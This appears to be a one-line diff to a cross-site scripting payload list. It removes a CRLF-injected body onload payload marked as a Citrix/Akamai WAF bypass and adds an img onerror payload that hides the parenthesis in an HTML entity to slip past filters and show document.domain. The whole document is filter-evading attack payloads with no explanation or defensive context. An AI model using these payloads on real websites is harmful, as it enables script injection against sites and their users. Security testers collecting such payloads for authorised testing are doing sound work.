@@ -1,1 +1,1 @@
-%0D%0A%0D%0A<body+x=%27&%27onload="(alert)(%27citrix+akamai+bypass%27)">
+"'<img src%3Dx onerror%3Dprompt%26%230000000040document.domain)>
